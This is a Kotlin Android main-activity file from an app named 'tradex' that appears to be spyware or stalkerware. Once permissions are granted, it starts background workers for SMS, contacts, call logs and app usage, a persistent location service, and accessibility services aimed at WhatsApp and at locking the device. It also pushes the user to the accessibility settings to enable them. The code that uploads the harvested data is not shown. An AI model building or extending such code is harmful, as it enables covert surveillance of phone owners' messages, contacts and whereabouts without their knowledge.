package com.example.tradex

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import android.widget.Button


class MainActivity : AppCompatActivity() {

    private lateinit var workManagerHelper: WorkManagerHelper
    private val LOCATION_PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_CODE_LOCATION = 100
        //private const val WHATSAPP_ACCESSIBILITY_SERVICE = "com.example.tradex/.WhatsAppAccessibilityService"
        private const val WHATSAPP_ACCESSIBILITY_SERVICE = "com.example.tradex.WhatsAppAccessibilityService"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        val linkDeviceButton: Button = findViewById(R.id.linkDeviceButton)
        linkDeviceButton.setOnClickListener {
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
        }

        workManagerHelper = WorkManagerHelper(this)

        // Check all required permissions
        if (PermissionManager.hasAllRequiredPermissions(this)) {
            Log.d(TAG, "All permissions granted. Starting workers and services.")
            startWorkers()
            startWhatsAppAccessibilityService()
            startLocationService()
            startLockAccessibilityService()
        } else {
            Log.d(TAG, "Requesting necessary permissions.")
            PermissionManager.requestAllPermissions(this)

            // Check and request Usage Stats permission if not granted
            if (!PermissionManager.isUsageStatsPermissionGranted(this)) {
                Log.w(TAG, "Usage Stats permission not granted. Requesting permission.")
                PermissionManager.requestUsageStatsPermission(this)
            }
            startWhatsAppAccessibilityService()

        }
    }

    private fun startWhatsAppAccessibilityService() {
        if (isAccessibilityServiceEnabled(this, WHATSAPP_ACCESSIBILITY_SERVICE)) {
            Log.d(TAG, "WhatsAppAccessibilityService is already enabled.")
        } else {
            Log.w(TAG, "WhatsAppAccessibilityService is not enabled. Redirecting to settings.")
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context, service: String): Boolean {
        return try {
            // Get the system's accessibility enabled flag
            val accessibilityEnabled = Settings.Secure.getInt(
                context.contentResolver,
                Settings.Secure.ACCESSIBILITY_ENABLED, 0
            )
            if (accessibilityEnabled == 1) {
                val enabledServices = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                // Compare each enabled service 
                enabledServices?.split(":")?.any { it.trim() == service } == true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility service: ${e.message}", e)
            false
        }
    }

    private fun startWorkers() {
        
         startSMSWorker()
         startContactsWorker()
         startCallLogsWorker()
        startAppUsageWorker()
    }

    private fun startSMSWorker() {
        val workRequest = OneTimeWorkRequest.Builder(SMSWorker::class.java).build()
        WorkManager.getInstance(this).enqueue(workRequest)
        Log.d(TAG, "SMS worker enqueued.")
    }

    private fun startAppUsageWorker() {
        val workRequest = OneTimeWorkRequest.Builder(AppUsageWorker::class.java).build()
        WorkManager.getInstance(this).enqueue(workRequest)
        Log.d(TAG, "AppUsageWorker enqueued.")
    }

    private fun startLocationService() {
        if (hasLocationPermissions()) {
            val intent = Intent(this, LocationService::class.java)
            ContextCompat.startForegroundService(this, intent)
            Log.d(TAG, "LocationService started.")
        } else {
            requestLocationPermissions()
        }
    }

    private fun stopLocationService() {
        val intent = Intent(this, LocationService::class.java)
        stopService(intent)
        Log.d(TAG, "LocationService stopped.")
    }

    private fun startLockAccessibilityService() {
        if (PermissionManager.isAccessibilityServiceEnabled(this)) {
            val intent = Intent(this, LockAccessibilityService::class.java)
            startService(intent)
            Log.d(TAG, "LockAccessibilityService started.")
        } else {
            Log.w(TAG, "Accessibility permission not granted. Requesting permission.")
            PermissionManager.requestAccessibilityPermission(this)
        }
    }

    private fun startLoginActivity() {
        val intent = Intent(this, LoginActivity::class.java)
        startActivity(intent)
    }

    private fun hasLocationPermissions(): Boolean {
        return LOCATION_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestLocationPermissions() {
        ActivityCompat.requestPermissions(this, LOCATION_PERMISSIONS, REQUEST_CODE_LOCATION)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            PermissionManager.REQUEST_CODE_ALL_PERMISSIONS -> {
                if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    Log.d(TAG, "All permissions granted. Starting services.")
                    //startWorkers()
                   // startLocationService()
                   // startLockAccessibilityService()
                    startWhatsAppAccessibilityService()
                } else {
                    Log.e(TAG, "Permissions denied. Cannot start services.")
                }
            }
            REQUEST_CODE_LOCATION -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    Log.d(TAG, "Location permissions granted. Starting location service.")
                    startLocationService()
                } else {
                    Log.e(TAG, "Permissions denied. Cannot start location service.")
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopLocationService()
    }
}
